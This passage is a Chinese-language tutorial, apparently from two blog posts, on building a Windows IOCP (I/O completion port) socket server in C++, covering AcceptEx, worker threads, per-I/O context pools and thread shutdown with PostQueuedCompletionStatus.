Richter的解释是因为“执行I/O请求的时间与线程执行其他任务的时间是重叠(overlapped)的”，从这个名字我们也可能看得出来重叠结构发明的初衷了，对于重叠结构的内部细节我这里就不过多的解释了，就把它当成和其他内核对象一样，不需要深究其实现机制，只要会使用就可以了，想要了解更多重叠结构内部的朋友，请去翻阅Jeffrey Richter的《Windows via C/C++》 5th 的292页。 ３、完成端口 “完成端口”这个名词中的“端口”和我们网络通信中的“端口”（0-65535）是不同的，个人感觉应该叫“完成队列”更直观一点。之所以叫“完成”端口，是因为系统在IO操作“完成”后再通知我们，也就是说当系统通知我们时，IO操作已经完成，比如说进行网络操作，系统通知我们时，并非时有数据从网络到来，而是数据已经接受完毕了，或者是socket接入已经完成等，我们只需处理后面的事情即可。 所谓的完成端口，其实就是一个“内核对象”，我们不需要深究其实现原理，只需使用相关的API把完成端口框架搭建起来，投递IO请求，然后就等待IO完成的通知。 ※使用完成端口的基本流程 总的来说，使用完成端口只要遵循如下几个步骤： 调用CreateIoCompletionPort() 函数创建一个完成端口。 建立和处理器的核数相等的工作线程（WorkerThread），这些线程不断地通过GetQueuedCompletionStatus() 函数扫描完成端口中是否有IO操作完成，如果有的话，将已经完成了的IO操作取出处理，处理完成后，再投递一个IO请求即可（下文有WorkerThread的流程图）。 初始化监听socket，调用bind()，listen()进行绑定监听。 调用CreateIoCompletionPort() 绑定listen socket 到 完成端口，并投递一个或多个AcceptEx请求。此处的AcceptEx是WinSock2 的扩展函数，作用是投递一个accept请求，当有socket接入是可以再2中的线程中处理。 以上即为完成端口的初始化和监听socket的初始化。下面介绍WorkerThread的工作流程： 不断地通过GetQueuedCompletionStatus() 函数扫描完成端口中是否有IO操作完成，如果有的话，将已经完成了的IO操作取出处理。 判断IO操作的类型： 1、如果为accept操作，调用CreateIoCompletionPort() 绑定新接入的socket 到 完成端口，向新接入的socket 投递一个WSARecv请求。 2、如果为WSARecv操作，处理接收到的数据，向这个socket 再投递一个WSARecv请求。 流程图如下： ※完成端口的实现(配合代码阅读更佳) ※1、创建一个完成端口 HANDLE completionPort = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0); CreateIoCompletionPort的参数如下： 1234567//功能：创建完成端口和关联完成端口 HANDLE WINAPI CreateIoCompletionPort( * __in HANDLE FileHandle, // 已经打开的文件句柄或者空句柄，一般是客户端的句柄 * __in HANDLE ExistingCompletionPort, // 已经存在的IOCP句柄 * __in ULONG_PTR CompletionKey, // 完成键，包含了指定I/O完成包的指定文件 * __in DWORD NumberOfConcurrentThreads // 真正并发同时执行最大线程数，一般推介是CPU核心数*2 * ); CreateIoCompletionPort函数有两个功能：创建一个完成端口将一个句柄关联到完成端口 我们创建时给的参数是(INVALID_HANDLE_VALUE, NULL, 0, 0)就是创建完成端口，下面会介绍关联完成端口。 ※2、建立Worker线程 123456789SYSTEM_INFO si;GetSystemInfo(&amp;si);workerThreadNum = si.dwNumberOfProcessors * 2;HANDLE *workerThreads = new HANDLE[workerThreadNum];for (int i = 0; i &lt; workerThreadNum; i++)&#123; workerThreads[i] = CreateThread(0, 0, WorkerThreadProc, (void *)this, 0, 0);&#125; 我们最好是建立CPU核心数量*2那么多的线程，这样更可以充分利用CPU资源，因为完成端口的调度是非常智能的，比如我们的Worker线程有的时候可能会有Sleep()或者WaitForSingleObject()之类的情况，这样同一个CPU核心上的另一个线程就可以代替这个Sleep的线程执行了；因为完成端口的目标是要使得CPU满负荷的工作。 WorkerThreadProc是Worker线程的线程函数，线程函数的具体内容我们后面再讲。 ※3、创建监听socket 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081BOOL IOCPBase::InitializeListenSocket() 2 &#123; 3 // 生成用于监听的socket的Context 4 listenSockContext = new SocketContext; 5 listenSockContext-&gt;connSocket = WSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, WSA_FLAG_OVERLAPPED); 6 if (INVALID_SOCKET == listenSockContext-&gt;connSocket) 7 return false; 8 9 // 将socket绑定到完成端口中10 if (NULL == CreateIoCompletionPort((HANDLE)listenSockContext-&gt;connSocket, completionPort, (DWORD)listenSockContext, 0))11 &#123;12 RELEASE_SOCKET(listenSockContext-&gt;connSocket);13 return false;14 &#125;15 16 //服务器地址信息，用于绑定socket17 sockaddr_in serverAddr;18 19 // 填充地址信息20 ZeroMemory((char *)&amp;serverAddr, sizeof(serverAddr));21 serverAddr.sin_family = AF_INET;22 serverAddr.sin_addr.s_addr = htonl(INADDR_ANY);23 serverAddr.sin_port = htons(port);24 25 // 绑定地址和端口26 if (SOCKET_ERROR == bind(listenSockContext-&gt;connSocket, (sockaddr *)&amp;serverAddr, sizeof(serverAddr)))27 &#123;28 return false;29 &#125;30 31 // 开始监听32 if (SOCKET_ERROR == listen(listenSockContext-&gt;connSocket, SOMAXCONN))33 &#123;34 return false;35 &#125;36 37 GUID guidAcceptEx = WSAID_ACCEPTEX;38 GUID guidGetAcceptSockAddrs = WSAID_GETACCEPTEXSOCKADDRS;39 // 提取扩展函数指针40 DWORD dwBytes = 0;41 if (SOCKET_ERROR == WSAIoctl(42 listenSockContext-&gt;connSocket,43 SIO_GET_EXTENSION_FUNCTION_POINTER,44 &amp;guidAcceptEx,45 sizeof(guidAcceptEx),46 &amp;fnAcceptEx,47 sizeof(fnAcceptEx),48 &amp;dwBytes,49 NULL,50 NULL))51 &#123;52 DeInitialize();53 return false;54 &#125;55 56 if (SOCKET_ERROR == WSAIoctl(57 listenSockContext-&gt;connSocket,58 SIO_GET_EXTENSION_FUNCTION_POINTER,59 &amp;guidGetAcceptSockAddrs,60 sizeof(guidGetAcceptSockAddrs),61 &amp;fnGetAcceptExSockAddrs,62 sizeof(fnGetAcceptExSockAddrs),63 &amp;dwBytes,64 NULL,65 NULL))66 &#123;67 DeInitialize();68 return false;69 &#125;70 71 for (size_t i = 0; i &lt; MAX_POST_ACCEPT; i++)72 &#123;73 IOContext *ioContext = listenSockContext-&gt;GetNewIOContext();74 if (false == PostAccept(listenSockContext, ioContext))75 &#123;76 listenSockContext-&gt;RemoveContext(ioContext);77 return false;78 &#125;79 &#125;80 return true;81 &#125; 用 CreateIoCompletionPort()函数把这个监听Socket和完成端口绑定,bind()，listen()，然后提取扩展函数AcceptEx和GetAcceptSockAddrs的指针，因为AcceptEx 实际上是存在于Winsock2结构体系之外的(因为是微软另外提供的)，所以如果我们直接调用AcceptEx的话，首先我们的代码就只能在微软的平台上用了，没有办法在其他平台上调用到该平台提供的AcceptEx的版本(如果有的话)， 而且我们每次调用AcceptEx时，Service Provider都得要通过WSAIoctl()获取一次该函数指针，效率太低了，所以我们自己获取函数指针。然后投递AcceptEx请求。 投递AcceptEx请求的代码 12345678910111213141516171819202122BOOL IOCPBase::PostAccept(SocketContext * sockContext, IOContext * ioContext)&#123; DWORD dwBytes = 0; ioContext-&gt;ioType = ACCEPT_POSTED; ioContext-&gt;ioSocket = WSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, WSA_FLAG_OVERLAPPED); if (INVALID_SOCKET == ioContext-&gt;ioSocket) &#123; return false; &#125; // 将接收缓冲置为0,令AcceptEx直接返回,防止拒绝服务攻击 if (false == fnAcceptEx(listenSockContext-&gt;connSocket, ioContext-&gt;ioSocket, ioContext-&gt;wsaBuf.buf, 0, sizeof(sockaddr_in) + 16, sizeof(sockaddr_in) + 16, &amp;dwBytes, &amp;ioContext-&gt;overLapped)) &#123; if (WSA_IO_PENDING != WSAGetLastError()) &#123; return false; &#125; &#125; InterlockedIncrement(&amp;acceptPostCnt); return true;&#125; AcceptEx 函数说明：参数1–sListenSocket, 这个就是那个唯一的用来监听的Socket了，没什么说的；参数2–sAcceptSocket, 用于接受连接的socket，这个就是那个需要我们事先建好的，等有客户端连接进来直接把这个Socket拿给它用的那个，是AcceptEx高性能的关键所在。参数3–lpOutputBuffer,接收缓冲区，这也是AcceptEx比较有特色的地方，既然AcceptEx不是普通的accpet函数，那么这个缓冲区也不是普通的缓冲区，这个缓冲区包含了三个信息：一是客户端发来的第一组数据，二是server的地址，三是client地址。参数4–dwReceiveDataLength，前面那个参数lpOutputBuffer中用于存放数据的空间大小。如果此参数=0，则Accept时将不会待数据到来，而直接返回，如果此参数不为0，那么一定得等接收到数据了才会返回，这里设为0直接返回,防止拒绝服务攻击参数5–dwLocalAddressLength，存放本地址地址信息的空间大小；参数6–dwRemoteAddressLength，存放本远端地址信息的空间大小；参数7–lpdwBytesReceived，out参数，对我们来说没用，不用管；参数8–lpOverlapped，本次重叠I/O所要用到的重叠结构。 因为每投递一次网络IO请求都要求提供一个WSABuf和WSAOVERLAPPED的参数，所以我们自定义一个IOContext类，每次投递附带这个类的变量，但要注意这个变量的生命周期，防止内存泄漏。 1234567891011121314151617181920212223242526272829303132333435363738class IOContext&#123;public: WSAOVERLAPPED overLapped; // 每个socket的每一个IO操作都需要一个重叠结构 SOCKET ioSocket; // 此IO操作对应的socket WSABUF wsaBuf; // 数据缓冲 IO_OPERATION_TYPE ioType; // IO操作类型 UINT connectID; // 连接ID IOContext() &#123; ZeroMemory(&amp;overLapped, sizeof(overLapped)); ioSocket = INVALID_SOCKET; wsaBuf.buf = (char *)::HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, BUFF_SIZE); wsaBuf.len = BUFF_SIZE; ioType = NULL_POSTED; connectID = 0; &#125; ~IOContext() &#123; RELEASE_SOCKET(ioSocket); if (wsaBuf.buf != NULL) ::HeapFree(::GetProcessHeap(), 0, wsaBuf.buf); &#125; void Reset() &#123; if (wsaBuf.buf != NULL) ZeroMemory(wsaBuf.buf, BUFF_SIZE); else wsaBuf.buf = (char *)::HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, BUFF_SIZE); ZeroMemory(&amp;overLapped, sizeof(overLapped)); ioType = NULL_POSTED; connectID = 0; &#125;&#125;; 对于每一个socket也定义了一个SocketContext的类和一个IOContextPool的缓冲池类的具体请查看代码。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869701 class SocketContext 2 &#123; 3 public: 4 SOCKET connSocket; // 连接的socket 5 SOCKADDR_IN clientAddr; // 连接的远程地址 6 7 private: 8 vector&lt;IOContext*&gt; arrIoContext; // 同一个socket上的多个IO请求 9 static IOContextPool ioContextPool; // 空闲的IOContext池10 CRITICAL_SECTION csLock;11 12 public:13 SocketContext()14 &#123;15 InitializeCriticalSection(&amp;csLock);16 arrIoContext.clear();17 connSocket = INVALID_SOCKET;18 ZeroMemory(&amp;clientAddr, sizeof(clientAddr));19 &#125;20 21 ~SocketContext()22 &#123;23 RELEASE_SOCKET(connSocket);24 25 // 回收所有的IOContext26 for (vector&lt;IOContext*&gt;::iterator it = arrIoContext.begin(); it != arrIoContext.end(); it++)27 &#123;28 ioContextPool.ReleaseIOContext(*it);29 &#125;30 31 EnterCriticalSection(&amp;csLock);32 arrIoContext.clear();33 LeaveCriticalSection(&amp;csLock);34 35 DeleteCriticalSection(&amp;csLock);36 &#125;37 38 // 获取一个新的IoContext39 IOContext *GetNewIOContext()40 &#123;41 IOContext *context = ioContextPool.AllocateIoContext();42 if (context != NULL)43 &#123;44 EnterCriticalSection(&amp;csLock);45 arrIoContext.push_back(context);46 LeaveCriticalSection(&amp;csLock);47 &#125;48 return context;49 &#125;50 51 // 从数组中移除一个指定的IoContext52 void RemoveContext(IOContext* pContext)53 &#123;54 for (vector&lt;IOContext*&gt;::iterator it = arrIoContext.begin(); it != arrIoContext.end(); it++)55 &#123;56 if (pContext == *it)57 &#123;58 ioContextPool.ReleaseIOContext(*it);59 60 EnterCriticalSection(&amp;csLock);61 arrIoContext.erase(it);62 LeaveCriticalSection(&amp;csLock);63 64 break;65 &#125;66 &#125;67 &#125;68 69 // 70 &#125;; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364651 // 空闲的IOContext管理类(IOContext池) 2 class IOContextPool 3 &#123; 4 private: 5 list&lt;IOContext *&gt; contextList; 6 CRITICAL_SECTION csLock; 7 8 public: 9 IOContextPool()10 &#123;11 InitializeCriticalSection(&amp;csLock);12 contextList.clear();13 14 EnterCriticalSection(&amp;csLock);15 for (size_t i = 0; i &lt; INIT_IOCONTEXT_NUM; i++)16 &#123;17 IOContext *context = new IOContext;18 contextList.push_back(context);19 &#125;20 LeaveCriticalSection(&amp;csLock);21 22 &#125;23 24 ~IOContextPool()25 &#123;26 EnterCriticalSection(&amp;csLock);27 for (list&lt;IOContext *&gt;::iterator it = contextList.begin(); it != contextList.end(); it++)28 &#123;29 delete (*it);30 &#125;31 contextList.clear();32 LeaveCriticalSection(&amp;csLock);33 34 DeleteCriticalSection(&amp;csLock);35 &#125;36 37 // 分配一个IOContxt38 IOContext *AllocateIoContext()39 &#123;40 IOContext *context = NULL;41 42 EnterCriticalSection(&amp;csLock);43 if (contextList.size() &gt; 0) //list不为空，从list中取一个44 &#123;45 context = contextList.back();46 contextList.pop_back();47 &#125;48 else //list为空，新建一个49 &#123;50 context = new IOContext;51 &#125;52 LeaveCriticalSection(&amp;csLock);53 54 return context;55 &#125;56 57 // 回收一个IOContxt58 void ReleaseIOContext(IOContext *pContext)59 &#123;60 pContext-&gt;Reset();61 EnterCriticalSection(&amp;csLock);62 contextList.push_front(pContext);63 LeaveCriticalSection(&amp;csLock);64 &#125;65 &#125;; ※4、Worker线程 这个工作线程所要做的工作就是几个Worker线程哥几个一起排好队队来监视完成端口的队列中是否有完成的网络操作就好了，代码大体如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495DWORD IOCPBase::WorkerThreadProc(LPVOID lpParam)&#123; IOCPBase *iocp = (IOCPBase*)lpParam; OVERLAPPED *ol = NULL; SocketContext *sockContext; DWORD dwBytes = 0; IOContext *ioContext = NULL; while (WAIT_OBJECT_0 != WaitForSingleObject(iocp-&gt;stopEvent, 0)) &#123; BOOL bRet = GetQueuedCompletionStatus(iocp-&gt;completionPort, &amp;dwBytes, (PULONG_PTR)&amp;sockContext, &amp;ol, INFINITE); // 读取传入的参数 ioContext = CONTAINING_RECORD(ol, IOContext, overLapped); // 收到退出标志 if (EXIT_CODE == (DWORD)sockContext) &#123; break; &#125; if (!bRet) &#123; DWORD dwErr = GetLastError(); // 如果是超时了，就再继续等吧 if (WAIT_TIMEOUT == dwErr) &#123; // 确认客户端是否还活着... if (!iocp-&gt;IsSocketAlive(sockContext-&gt;connSocket)) &#123; iocp-&gt;OnConnectionClosed(sockContext); // 回收socket iocp-&gt;DoClose(sockContext); continue; &#125; else &#123; continue; &#125; &#125; // 可能是客户端异常退出了(64) else if (ERROR_NETNAME_DELETED == dwErr) &#123; iocp-&gt;OnConnectionError(sockContext, dwErr); // 回收socket iocp-&gt;DoClose(sockContext); continue; &#125; else &#123; iocp-&gt;OnConnectionError(sockContext, dwErr); // 回收socket iocp-&gt;DoClose(sockContext); continue; &#125; &#125; else &#123; // 判断是否有客户端断开 if ((0 == dwBytes) &amp;&amp; (RECV_POSTED == ioContext-&gt;ioType || SEND_POSTED == ioContext-&gt;ioType)) &#123; iocp-&gt;OnConnectionClosed(sockContext); // 回收socket iocp-&gt;DoClose(sockContext); continue; &#125; else &#123; switch (ioContext-&gt;ioType) &#123; case ACCEPT_POSTED: iocp-&gt;DoAccpet(sockContext, ioContext); break; case RECV_POSTED: iocp-&gt;DoRecv(sockContext, ioContext); break; case SEND_POSTED: iocp-&gt;DoSend(sockContext, ioContext); break; default: break; &#125; &#125; &#125; &#125; // 释放线程参数 RELEASE(lpParam); return 0;&#125; 其中的GetQueuedCompletionStatus()就是Worker线程里第一件也是最重要的一件事了，会让Worker线程进入不占用CPU的睡眠状态，直到完成端口上出现了需要处理的网络操作或者超出了等待的时间限制为止。 一旦完成端口上出现了已完成的I/O请求，那么等待的线程会被立刻唤醒，然后继续执行后续的代码。 至于这个神奇的函数，原型是这样的： 1234567BOOL WINAPI GetQueuedCompletionStatus( __in HANDLE CompletionPort, // 这个就是我们建立的那个唯一的完成端口 __out LPDWORD lpNumberOfBytes, //这个是操作完成后返回的字节数 __out PULONG_PTR lpCompletionKey, // 这个是我们建立完成端口的时候绑定的那个自定义结构体参数 __out LPOVERLAPPED *lpOverlapped, // 这个是我们在连入Socket的时候一起建立的那个重叠结构 __in DWORD dwMilliseconds // 等待完成端口的超时时间，如果线程不需要做其他的事情，那就INFINITE就行了 ); 如果这个函数突然返回了，那就说明有需要处理的网络操作了 — 当然，在没有出现错误的情况下。 然后switch()一下，根据需要处理的操作类型，那我们来进行相应的处理。 那我们如何直到需要处理的操作类型呢？这个就要用到我们定义的IOContext类，里面有一个WSAOVERLAPPED的变量和操作类型（参见第3步）。那有如何吧IOContext变量传进来呢？同样参见第三步我们投递AcceptEx请求时传入了一个&amp;ioContext-&gt;overLapped参数。我们可以使用PER_IO_CONTEXT这个宏来通过ioContext-&gt;overLapped取得ioContext的地址，如此我们便取得操作类型和ioContext中的WSAbuf。数据就存放在WSABuf中。 另外，我们注意到关联socket到完成端口时，我们给CreateIoCompletionPort()函数的第三个参数ULONG_PTR CompletionKey参数传递了listenSockContext变量，我们可以在GetQueuedCompletionStatus的第三个参数取得这个传进来的变量。如此我们就通过完成端口穿进去了两个变量，理解这两个变量的传递时理解完成端口模式的关键，我之前就时卡着这里。 WorkerThreadProc线程中还有一些错误处理函数，自行查看。 ※5、收到accept通知时调用DoAccept() 在用户收到AcceptEx的完成通知时，需要后续代码并不多，我们把代码放到DoAccept()中：需要做三件事情： 为新接入的socket分配资源。向新接入的socket投递一个WSARecv请求向监听socket投递继续Accept请求 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465661 BOOL IOCPBase::DoAccpet(SocketContext * sockContext, IOContext * ioContext) 2 &#123; 3 4 InterlockedIncrement(&amp;connectCnt); 5 InterlockedDecrement(&amp;acceptPostCnt); 6 SOCKADDR_IN *clientAddr = NULL; 7 SOCKADDR_IN *localAddr = NULL; 8 int clientAddrLen, localAddrLen; 9 clientAddrLen = localAddrLen = sizeof(SOCKADDR_IN);10 11 // 1. 获取地址信息 （GetAcceptExSockAddrs函数不仅可以获取地址信息，还可以顺便取出第一组数据）12 fnGetAcceptExSockAddrs(ioContext-&gt;wsaBuf.buf, 0, localAddrLen, clientAddrLen, (LPSOCKADDR *)&amp;localAddr, &amp;localAddrLen, (LPSOCKADDR *)&amp;clientAddr, &amp;clientAddrLen);13 14 // 2. 为新连接建立一个SocketContext 15 SocketContext *newSockContext = new SocketContext;16 newSockContext-&gt;connSocket = ioContext-&gt;ioSocket;17 memcpy_s(&amp;(newSockContext-&gt;clientAddr), sizeof(SOCKADDR_IN), clientAddr, sizeof(SOCKADDR_IN));18 19 // 3. 将listenSocketContext的IOContext 重置后继续投递AcceptEx20 ioContext-&gt;Reset();21 if (false == PostAccept(listenSockContext, ioContext))22 &#123;23 listenSockContext-&gt;RemoveContext(ioContext);24 &#125;25 26 // 4. 将新socket和完成端口绑定27 if (NULL == CreateIoCompletionPort((HANDLE)newSockContext-&gt;connSocket, completionPort, (DWORD)newSockContext, 0))28 &#123;29 DWORD dwErr = WSAGetLastError();30 if (dwErr != ERROR_INVALID_PARAMETER)31 &#123;32 DoClose(newSockContext);33 return false;34 &#125;35 &#125;36 37 // 并设置tcp_keepalive38 tcp_keepalive alive_in;39 tcp_keepalive alive_out;40 alive_in.onoff = TRUE;41 alive_in.keepalivetime = 1000 * 60; // 60s 多长时间（ ms ）没有数据就开始 send 心跳包42 alive_in.keepaliveinterval = 1000 * 10; //10s 每隔多长时间（ ms ） send 一个心跳包43 unsigned long ulBytesReturn = 0;44 if (SOCKET_ERROR == WSAIoctl(newSockContext-&gt;connSocket, SIO_KEEPALIVE_VALS, &amp;alive_in, sizeof(alive_in), &amp;alive_out, sizeof(alive_out), &amp;ulBytesReturn, NULL, NULL))45 &#123;46 TRACE(L&quot;WSAIoctl failed: %d/n&quot;, WSAGetLastError());47 &#125;48 49 50 OnConnectionEstablished(newSockContext);51 52 // 5. 建立recv操作所需的ioContext，在新连接的socket上投递recv请求53 IOContext *newIoContext = newSockContext-&gt;GetNewIOContext();54 newIoContext-&gt;ioType = RECV_POSTED;55 newIoContext-&gt;ioSocket = newSockContext-&gt;connSocket;56 // 投递recv请求57 if (false == PostRecv(newSockContext, newIoContext))58 &#123;59 DoClose(sockContext);60 return false;61 &#125;62 63 return true;64 &#125;DoAccpet 1234567891011121314151617181920212223241 BOOL IOCPBase::PostAccept(SocketContext * sockContext, IOContext * ioContext) 2 &#123; 3 DWORD dwBytes = 0; 4 ioContext-&gt;ioType = ACCEPT_POSTED; 5 ioContext-&gt;ioSocket = WSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, WSA_FLAG_OVERLAPPED); 6 if (INVALID_SOCKET == ioContext-&gt;ioSocket) 7 &#123; 8 return false; 9 &#125;10 11 // 将接收缓冲置为0,令AcceptEx直接返回,防止拒绝服务攻击12 if (false == fnAcceptEx(listenSockContext-&gt;connSocket, ioContext-&gt;ioSocket, ioContext-&gt;wsaBuf.buf, 0, sizeof(sockaddr_in) + 16, sizeof(sockaddr_in) + 16, &amp;dwBytes, &amp;ioContext-&gt;overLapped))13 &#123;14 if (WSA_IO_PENDING != WSAGetLastError())15 &#123;16 return false;17 &#125;18 &#125;19 20 InterlockedIncrement(&amp;acceptPostCnt);21 return true;22 &#125;PostAccept 12345678910111213141516171 BOOL IOCPBase::PostRecv(SocketContext * sockContext, IOContext *ioContext) 2 &#123; 3 DWORD dwFlags = 0, dwBytes = 0; 4 ioContext-&gt;Reset(); 5 ioContext-&gt;ioType = RECV_POSTED; 6 7 int nBytesRecv = WSARecv(ioContext-&gt;ioSocket, &amp;ioContext-&gt;wsaBuf, 1, &amp;dwBytes, &amp;dwFlags, &amp;ioContext-&gt;overLapped, NULL); 8 // 如果返回值错误，并且错误的代码并非是Pending的话，那就说明这个重叠请求失败了 9 if ((SOCKET_ERROR == nBytesRecv) &amp;&amp; (WSA_IO_PENDING != WSAGetLastError()))10 &#123;11 DoClose(sockContext);12 return false;13 &#125;14 return true;15 &#125;PostRecv 此处要注意理清第4步中说的两个变量的传入。 DoAccept中还调用了OnConnectionEstablished()函数，这是一个虚函数，派生类重载这个函数即可处理连接接入的通知。具体看代码里的例程。 ※6、收到recv通知时调用DoRecv() 在用户收到recv的完成通知时，需要后续代码并不多，我们把代码放到DoRecv()中：需要做两件事情： 处理WSABuf中的数据向此socket重新投递一个WSARecv请求 1234567891011121314BOOL IOCPBase::DoRecv(SocketContext * sockContext, IOContext * ioContext)&#123; OnRecvCompleted(sockContext, ioContext); ioContext-&gt;Reset(); if (false == PostRecv(sockContext, ioContext)) &#123; DoClose(sockContext); return false; &#125; return true;&#125;DoRecv 此处要注意理清第4步中说的两个变量的传入。 ※7、关闭完成端口 Worker线程一旦进入了GetQueuedCompletionStatus()的阶段，就会进入睡眠状态，INFINITE的等待完成端口中，如果完成端口上一直都没有已经完成的I/O请求，那么这些线程将无法被唤醒，这也意味着线程没法正常退出。 熟悉或者不熟悉多线程编程的朋友，都应该知道，如果在线程睡眠的时候，简单粗暴的就把线程关闭掉的话，那是会一个很可怕的事情，因为很多线程体内很多资源都来不及释放掉，无论是这些资源最后是否会被操作系统回收，我们作为一个C++程序员来讲，都不应该允许这样的事情出现。 所以我们必须得有一个很优雅的，让线程自己退出的办法。 这时会用到我们这次见到的与完成端口有关的最后一个API，叫 PostQueuedCompletionStatus()，从名字上也能看得出来，这个是和 GetQueuedCompletionStatus() 函数相对的，这个函数的用途就是可以让我们手动的添加一个完成端口I/O操作，这样处于睡眠等待的状态的线程就会有一个被唤醒，如果为我们每一个Worker线程都调用一次PostQueuedCompletionStatus()的话，那么所有的线程也就会因此而被唤醒了。 PostQueuedCompletionStatus()函数的原型是这样定义的： 123456BOOL WINAPI PostQueuedCompletionStatus( __in HANDLE CompletionPort, __in DWORD dwNumberOfBytesTransferred, __in ULONG_PTR dwCompletionKey, __in_opt LPOVERLAPPED lpOverlapped ); 我们可以看到，这个函数的参数几乎和GetQueuedCompletionStatus()的一模一样，都是需要把我们建立的完成端口传进去，然后后面的三个参数是 传输字节数、结构体参数、重叠结构的指针. 注意，这里也有一个很神奇的事情，正常情况下，GetQueuedCompletionStatus()获取回来的参数本来是应该是系统帮我们填充的，或者是在绑定完成端口时就有的，但是我们这里却可以直接使用PostQueuedCompletionStatus()直接将后面三个参数传递给GetQueuedCompletionStatus()，这样就非常方便了。 例如，我们为了能够实现通知线程退出的效果，可以自己定义一些约定，比如把这后面三个参数设置一个特殊的值，然后Worker线程接收到完成通知之后，通过判断这3个参数中是否出现了特殊的值，来决定是否是应该退出线程了。 例如我们在调用的时候，就可以这样： 12345for (int i = 0; i &lt; workerThreadNum; i++)&#123; // 通知所有完成端口退出 PostQueuedCompletionStatus(completionPort, 0, (DWORD)EXIT_CODE, NULL);&#125; 谢谢大家看到这里！！！（完） ※MFC高性能网络编程：完成端口[21][22] ※前言 今天讨论的完成端口是套接字通讯一般来讲是高性能服务器编程才会用到的一种方式，是一种一般面向大量客户端和大量数据的通讯方式，比如说自动售货机或者是ofo这种东西，而且单片机编程需要网络编程的话一般都是套接字通讯，其实就连http通讯都是套接字通讯的一种封装，其实说大一点一旦涉及到网络编程说穿了就是socket编程。 说到socket通讯的话，目前世界上最好的模型就是微软的完成端口，没有之一。无论从响应速度还是资源占用，完成端口都是最好的。可以说一旦在windows服务器上搞网络编程没有比完成端口更好的选择。我自己实际测试的结果是即便达到数十万的长连接情况上完成端口模型下的程序几乎不会占用超过5%的CPU资源，相当NB。但是完成端口也不是没有缺点，最大的缺点可以说也是唯一的缺点就是开发难度很大，稍微不注意就会出错。我之前刚刚开始研制这个模型的时候上CSDN发了一个帖子请教各路大神，统一得到一种回复：勿在浮沙筑高台。全部是劝没有这个水平就千万不要用。但是我觉得模型本身只要理解清楚了也不会有什么问题，只要你有一定的基础写一个可以完美运行的服务端程序还是没有太大的问题。废话结束我们直接开始较为详细的讲解一下这个东西是怎么回事。机制 完成端口的其实全称是IO完成端口，英文缩写是IOCP。本质上来讲其实是等待IO空闲之后便执行下一个IO操作，其实从原来上来讲任何IO操作的程序都可以使用完成端口，比如说串口通讯等等。整个机制简单描述一下流程就是使用一个微软封装的十分NB的工具实例化一个IOCP类，同时搞很多个工作线程出来，每一个工作线程相互独立，使用两个结构体指针传递和同步数据（这两个结构体十分重要之后我们详细会讲），这些线程会被休眠起来，一但我们向IOCP类投递一个请求之后，一旦这个请求被执行那么，马上会有一个工作线程被唤醒去执行相对于的操作，然后我们只需在操作结束之后再一次投递这个请求就行了。由于IOCP这种机制这就是速度快的原因性能高的原因，它既不阻塞线程（只是休眠）同时是一个并行的操作，有很多个工作线程都在休眠一旦请求来了就执行所以它可以毫无压力的操作十分大量的连接。 以上就是对IOCP一个十分十分十分基础的理解，但是对于开发而言绝壁够了，只要你不去挖这个模型是否深处的东西仅仅用于开发，那么最好保持这个理解。基础理解就这样，同时我们还需要有一些基础知识才能进入实际流程的分析和拆解： 基础MFC编程 socket编程 基础多线程编程知识 较为扎实的C++基础 ※流程 1、调用 CreateIoCompletionPort() 函数创建一个完成端口m_hIOCompletionPort，而且在一般情况下，我们需要且只需要建立这一个完成端口，把它的句柄保存好。这个函数的参数一看就很简单-1,0,0,0四个值就搞定了。 HANDLE m_hIOCompletionPort = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0 ); 2、建立工作线程，通过得到系统CPU数量然后建立这个数值两倍的线程。为什么是两倍我也不知道，大概是网上很多高手都推荐的一个数量，还有是2倍加2的，这个最好就按照标准来两倍就可以了。 12345678910111213141516171819202122232425262728293031SYSTEM_INFO si;GetSystemInfo(&amp;si);int m_nProcessors = si.dwNumberOfProcessors;m_nThreads = 2 * m_nProcessors;HANDLE *m_phWorkerThreads = new HANDLE[m_nThreads];for (int i = 0; i &lt; m_nThreads; i++)&#123; m_phWorkerThreads[i] = ::CreateThread(0, 0, _WorkerThread, …);&#125;```3、这一步就是常规操作了初始化windows的Socket库创建一个监听套件字，绑定端口，监听起来。唯一需要注意的是WSASocket()函数一定要使用WSA_FLAG_OVERLAPPED，这个是一个申明标志我这个socket会使用重叠结构体。```c++// 初始化Socket库WSADATA wsaData;WSAStartup(MAKEWORD(2, 2), &amp;wsaData);//初始化Socketstruct sockaddr_in ServerAddress;// 这里需要特别注意，如果要使用重叠I/O的话，这里必须要使用WSASocket来初始化Socket// 注意里面有个WSA_FLAG_OVERLAPPED参数SOCKET m_sockListen = WSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, WSA_FLAG_OVERLAPPED);// 填充地址结构信息ZeroMemory((char *)&amp;ServerAddress, sizeof(ServerAddress));ServerAddress.sin_family = AF_INET;// 这里可以选择绑定任何一个可用的地址，或者是自己指定的一个IP地址//ServerAddress.sin_addr.s_addr = htonl(INADDR_ANY);ServerAddress.sin_addr.s_addr = inet_addr(“你的IP”);ServerAddress.sin_port = htons(11111);// 绑定端口if (SOCKET_ERROR == bind(m_sockListen, (struct sockaddr *)&amp;ServerAddress, sizeof(ServerAddress)))// 开始监听 listen(m_sockListen,SOMAXCONN)) 4、接下来就是一个很关键的一步了我们要让完成端口来帮助我们监听，那么这个socket必须和IOCP有一定的关系，一旦socket有连接请求过来了之后需要IOCP响应那么第一步就是把socket与IOCP绑定起来，这里有一个奇怪的地方，它还是使用的CreateIoCompletionPort() 函数与创建完成端口句柄是通一个函数，不要弄错了，他们仅仅是参数不同。这里就是直接调用就可以了，我将这个函数参数说说就可以了。返回NULL说明操作失败。 123456789HANDLE WINAPI CreateIoCompletionPort( __in HANDLE FileHandle, // 